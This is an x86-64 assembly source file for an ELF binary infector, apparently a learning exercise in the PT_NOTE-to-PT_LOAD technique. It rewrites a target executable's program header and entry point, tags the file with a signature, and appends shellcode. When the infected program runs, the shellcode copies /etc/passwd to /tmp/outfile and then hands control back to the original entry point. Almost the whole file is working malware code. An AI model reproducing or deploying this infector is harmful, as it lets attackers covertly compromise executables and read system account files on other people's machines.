section .data
    flags dq 2      ; 0_RDWR
    mode dq 0666    ; r/w permissions for user, group and others

    ; Buffer to retrieve the ELF header
    buffer_len equ 4096       ; Assuming a PT_NOTE is present and is within the first 4096 bytes
    buffer times buffer_len db 0

    ; Messages
    elf_msg db "The provided file has a ELF header.", 10
    elf_len equ $ - elf_msg

    ; Error messages
    not_elf_msg db "The provided file does not have a ELF header.", 10
    not_elf_len equ $ - not_elf_msg

    no_pt_note_msg db "The provided file does not have a PT_NOTE segment.", 10
    no_pt_note_len equ $ - no_pt_note_msg

    is_dir_msg db "The provided file is a directory.", 10
    is_dir_len equ $ - is_dir_msg

    miss_msg db "The provided file does not exist.", 10
    miss_len equ $ - miss_msg

    after_infect_msg db "The provided file was successfully infected.", 10
    after_infect_len equ $ - after_infect_msg

    no_arg_msg db "Please provide a file to infect.", 10
    no_arg_len equ $ - no_arg_msg

    is_inf_msg db "The provided file is already infected.", 10
    is_inf_len equ $ - is_inf_msg

    ; Inspired by https://shell-storm.org/shellcode/files/shellcode-867.html, still copies /etc/passwd to /tmp/outfile but replaced some registers and added instructions
    shellcode db 0x54, 0x56, 0x57, 0x50, 0x53, 0x52 ; push rsp, push rsi, push rdi, push rax, push rbx, push rdx
        db 0x48, 0x81, 0xec, 0x00, 0x10, 0x00, 0x00 ; sub rsp, 0x1000

        db 0x49, 0x89, 0xe7                         ; mov r15, rsp
        db 0x48, 0x31, 0xc0                         ; xor rax, rax
        db 0xb0, 0x02                               ; mov al, 2
        db 0x48, 0x31, 0xff                         ; xor rdi, rdi
        db 0xbb, 0x73, 0x77, 0x64, 0x00             ; mov ebx, 0x647773
        db 0x49, 0x83, 0xef, 0x08                   ; sub r15, 0x8
        db 0x49, 0x89, 0x1f                         ; mov [r15], rbx
        db 0x48, 0xbb, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73   ; movabs rbx, 0x7361702f6374652f
        db 0x49, 0x83, 0xef, 0x08                   ; sub r15, 0x8 
        db 0x49, 0x89, 0x1f                         ; mov [r15], rbx
        db 0x49, 0x8d, 0x3f                         ; lea rdi, [r15]
        db 0x48, 0x31, 0xf6                         ; xor rsi, rsi
        db 0x0f, 0x05                               ; syscall

        db 0x48, 0x89, 0xc3                         ; mov rbx, rax
        db 0x48, 0x31, 0xc0                         ; xor rax, rax
        db 0x48, 0x89, 0xdf                         ; mov rdi, rbx
        db 0x4c, 0x89, 0xfe                         ; mov rsi, r15
        db 0x66, 0xba, 0xff, 0xff                   ; mov dx, 0xffff
        db 0x0f, 0x05                               ; syscall

        db 0x49, 0x89, 0xc0                         ; mov r8, rax
        db 0x4c, 0x89, 0xf8                         ; mov rax, r15
        db 0x48, 0x31, 0xdb                         ; xor rbx, rbx
        db 0x49, 0x83, 0xef, 0x08                   ; sub r15, 8
        db 0x49, 0x83, 0xef, 0x08                   ; sub r15, 0x8 
        db 0x49, 0x89, 0x1f                         ; mov [r15], rbx
        db 0xbb, 0x66, 0x69, 0x6c, 0x65             ; mov ebx, 0x656c6966
        db 0x49, 0x83, 0xef, 0x08                   ; sub r15, 0x8 
        db 0x49, 0x89, 0x1f                         ; mov [r15], rbx
        db 0x48, 0xbb, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x6f, 0x75, 0x74   ; movabs rbx, 0x74756f2f706d742f
        db 0x49, 0x83, 0xef, 0x08                   ; sub r15, 0x8 
        db 0x49, 0x89, 0x1f                         ; mov [r15], rbx
        db 0x48, 0x89, 0xc3                         ; mov rbx, rax
        db 0x48, 0x31, 0xc0                         ; xor rax, rax
        db 0xb0, 0x02                               ; mov al, 2
        db 0x49, 0x8d, 0x3f                         ; lea rdi, [r15]
        db 0x48, 0x31, 0xf6                         ; xor rsi, rsi
        db 0x66, 0xbe, 0x66, 0x00                   ; mov si, 0x66
        db 0x0f, 0x05                               ; syscall

        db 0x48, 0x89, 0xc7                         ; mov rdi, rax
        db 0x48, 0x31, 0xc0                         ; xor rax, rax
        db 0xb0, 0x01                               ; mov al, 1
        db 0x48, 0x8d, 0x33                         ; lea rsi, [rbx]
        db 0x48, 0x31, 0xd2                         ; xor rdx, rdx
        db 0x4c, 0x89, 0xc2                         ; mov rdx, r8
        db 0x0f, 0x05                               ; syscall

        db 0x48, 0x81, 0xc4, 0x00, 0x10, 0x00, 0x00 ; add rsp, 0x1000
        db 0x5a, 0x5b, 0x58, 0x5f, 0x5e, 0x5c       ; pop rdx, pop rbx, pop rax, pop rdi, pop rsi, pop rsp

        db 0xE9, 0x00, 0x00, 0x00, 0x00 ; jmp 0x0 (little endian) (relative to RIP)
    shellcode_len equ $ - shellcode

    signature db 0x43, 0x68, 0x34, 0x6E, 0x74, 0x65, 0x52   ; Ch4nteR

section .bss
    fd resq 1
    old_e_entry resq 1
    ph_offset resq 1
    ph_entry_size resq 1
    ph_num resq 1
    loop_counter resq 1
    stat_buffer resb 144
    file_size resq 1

section .text
    global _start

_start:
    mov rbx, [rsp + 16] ; rsp + 16 is argv[1]
    test rbx, rbx       ; if rbx is 0, no arg was provided
    jz no_arg
    
    ; Open the file
    mov rax, 2
    mov rdi, rbx 
    mov rsi, [flags]
    mov rdx, [mode]
    syscall
    mov [fd], rax        ; file descriptor

    ; Read the file contents
    mov rax, 0          
    mov rdi, [fd]
    mov rsi, buffer
    mov rdx, buffer_len
    syscall

    ; Get file information
    mov rax, 5
    mov rdi, [fd]
    mov rsi, stat_buffer
    syscall

    ; Get the file size
    mov rax, [stat_buffer + 48]  
    mov [file_size], rax

    ; Check if it is a directory
    jmp check_dir

no_arg:
    mov rax, 1
    mov rdi, 1
    mov rsi, no_arg_msg
    mov rdx, no_arg_len
    syscall

    jmp close

check_dir:
    ; Depending on the file descriptor LSB, we know if it's a file, a directory or a missing file
    ; File's LSB is 3, directory's is B and missing file's is E
    mov rdi, [fd]
    and rdi, 0xF        ; Get the LSB

    cmp rdi, 0xB        ; Check if it is a directory
    je is_dir

    cmp rdi, 0xE        ; Check if it is a missing file
    je missing_file

    ; If it is not a directory, check if it is an ELF file
    jmp check_elf

check_elf:
    ; Check for leading characters of a file with an ELF header
    mov rsi, buffer
    mov al, [rsi]
    cmp al, 0x7F
    jne not_elf

    inc rsi
    mov al, [rsi]
    cmp al, 'E'
    jne not_elf

    inc rsi
    mov al, [rsi]
    cmp al, 'L'
    jne not_elf

    inc rsi
    mov al, [rsi]
    cmp al, 'F'
    jne not_elf

    jmp is_elf

is_dir:
    ; Display an error message
    mov rax, 1          
    mov rdi, 1
    mov rsi, is_dir_msg
    mov rdx, is_dir_len
    syscall

    jmp close

missing_file:
    ; Display an error message
    mov rax, 1          
    mov rdi, 1
    mov rsi, miss_msg
    mov rdx, miss_len
    syscall

    jmp close

is_elf:
    ; Display ELF header message
    mov rax, 1          
    mov rdi, 1
    mov rsi, elf_msg
    mov rdx, elf_len
    syscall

    jmp check_signature

check_signature:
    mov rsi, buffer
    add rsi, 8
    mov rax, [rsi]
    cmp rax, [signature]
    je is_infected

    jmp retrieve_info

is_infected:
    mov rax, 1
    mov rdi, 1
    mov rsi, is_inf_msg
    mov rdx, is_inf_len
    syscall

    jmp close

retrieve_info:
    ; Retrieve information needed to infect the ELF file
    mov rsi, buffer
    add rsi, 24
    mov rax, [rsi]      ; Get the e_entry field
    mov [old_e_entry], rax

    add rsi, 8         ; Move to the e_phoff field (32 bytes offset in the ELF header)
    mov rax, [rsi]      ; Get the e_phoff field
    mov [ph_offset], rax

    add rsi, 22         ; Move to the e_phentsize field
    mov ax, word [rsi]  ; Get the e_phentsize field
    movzx rax, ax
    mov [ph_entry_size], rax

    add rsi, 2          ; Move to the e_phnum field
    mov ax, word [rsi]  ; Get the e_phnum field
    movzx rax, ax
    mov [ph_num], rax

    ; Parse program header
    mov rcx, [ph_num]
    test rcx, rcx
    jz close

    mov rsi, buffer
    add rsi, [ph_offset]

    jmp search_pt_note

search_pt_note:
    ; Search for a PT_NOTE segment
    mov [loop_counter], rcx

    mov rax, [rsi]      ; Get the p_type field
    cmp eax, 4          ; Check if it is a PT_NOTE segment (isolate the last 8 bits because it's written on 8 bits)
    jne next_ph

    jmp infect

next_ph:
    ; Move to the next program header
    add rsi, [ph_entry_size]
    mov rcx, [loop_counter]
    dec rcx
    mov [loop_counter], rcx
    jnz search_pt_note

    jmp no_pt_note

no_pt_note:
    mov rax, 1          
    mov rdi, 1
    mov rsi, no_pt_note_msg
    mov rdx, no_pt_note_len
    syscall

    jmp close

infect:
    ;;; Edit program header ;;;
    ; Change PT_NOTE segment to PT_LOAD
    xor eax, eax        ; Clear eax
    or eax, 1           ; Set the last 16 bits to 1 (PT_LOAD)
    mov [rsi], eax

    ; Give read and execute permissions to the segment
    xor eax, eax        ; Clear eax
    or eax, 5           ; r/x permissions
    mov [rsi + 4], eax

    ; Change the offset to the end
    ; p_offset is twice as big so we'll use rax
    mov rax, [file_size]
    mov [rsi + 8], rax

    ; Change the entry point to somewhere very far
    xor rax, rax
    or rax, 0xF00000
    add rax, [file_size]
    mov rbx, rax            ; Save for later use
    mov [rsi + 16], rax

    ; Add shellcode_len to filesz and memsz
    mov rax, [rsi + 32] ; Get the p_filesz field
    add rax, shellcode_len
    mov [rsi + 32], rax

    mov rax, [rsi + 40] ; Get the p_memsz field
    add rax, shellcode_len
    mov [rsi + 40], rax

    ; Set p_align to 0x1000 (most PT_LOAD segment have P_ALIGN at 0x1000)
    mov rax, 0x1000
    mov [rsi + 48], rax

    ;;; Edit ELF header ;;;
    mov rsi, buffer

    ; Add signature
    mov rcx, [signature]
    mov [rsi + 8], rcx

    ; Change e_entry to the new one
    mov [rsi + 24], rbx     ; rbx has previously computed P_VADDR

    mov r15, [fd]   ; If we use [fd] directly the second one won't work

    ; Write the buffer changes to the file
    mov rax, 18      ; pwrite64
    mov rdi, r15 
    mov rsi, buffer
    mov rdx, buffer_len
    xor r10, r10    ; No offset
    syscall

    ; Update shellcode to jump to the original entry point
    mov rax, rbx                ; + start of shellcode (rbx has P_VADDR)
    add rax, shellcode_len      ; + shellcode = jmp address
    mov rcx, [old_e_entry]      ; we use original e_entry as a baseline
    sub rcx, rax                ; and substract the added stuff from it
    mov rsi, shellcode      
    mov [rsi + shellcode_len - 4], ecx         ; 4 for the placeholders

    ; Write the shellcode at the end of the file
    mov rax, 18      ; pwrite64
    mov rdi, r15
    mov rsi, shellcode
    mov rdx, shellcode_len
    mov r10, [file_size]
    syscall

    mov rax, 1          
    mov rdi, 1
    mov rsi, after_infect_msg
    mov rdx, after_infect_len
    syscall

    jmp close

not_elf:
    ; Display an error message
    mov rax, 1
    mov rdi, 1
    mov rsi, not_elf_msg
    mov rdx, not_elf_len
    syscall

    jmp close

close:
    ; Close the file and exit
    mov rax, 3
    mov rdi, [fd]
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall